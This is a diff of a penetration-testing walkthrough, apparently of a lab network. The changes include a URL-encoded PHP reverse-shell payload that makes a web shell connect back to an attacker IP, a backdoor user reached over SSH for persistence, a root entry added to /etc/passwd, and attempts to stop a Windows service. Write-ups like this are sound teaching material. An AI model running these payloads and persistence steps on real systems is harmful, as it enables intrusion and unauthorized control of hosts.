@@ -1056,7 +1056,7 @@ This time it worked:
 
     www-data
 
-At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine=
+At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine on port 1222
 
      http://192.168.100.1:8080/ws.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1222%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
@@ -1109,7 +1109,7 @@ Since ssh is enabled I decided to create a new user to have a persistent access 
 
 Then we can login with ssh using the host IP, so we don't to use the ligolo tunnell anymore:
 
-    sh support-it@10.200.95.33
+    ssh support-it@10.200.95.33
     ...
     Could not chdir to home directory /home/support-it: No such file or directory
     $ /bin/bash
@@ -1130,7 +1130,7 @@ Again we can take advantage of the docker suid vulnearbility to add another user
 Now we can proceed to add a new entry to the /etc/passwd file with root privilege, but first we need to generate a compliance [password hash](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow):
 
     openssl passwd -6 -salt xyz Pwd1234
-    $6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt
+    $6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt.
 
 Then we can insert at the end of the /etc/passwd file the following line:
 
@@ -1723,8 +1723,21 @@ Now we need to perform an invasive action, since we are going to stop lanmanserv
 
    
     sc stop lanmanserver
-    sc config lanmanserver start= disabled
-   
+
+But I got an error:
+
+    A stop control has been sent to a service that other running services are dependent on.
+
+So there is a dependency active for the service. Using powershell we can find which service depends on:
+
+    PS C:\Windows\system32> Get-Service -Name lanmanserver  -DependentServices
+    
+    Status   Name               DisplayName
+    ------   ----               -----------
+    Running  Netlogon           Netlogon
+
+This is another problem, we cannot disable the netlogon since we won't be able to connect to the server using RDP. Netlogon authenticates users and other services within a domain.
+-------------------------------------- TODO ---------------------------------------------------------
 
 Then reboot:
 
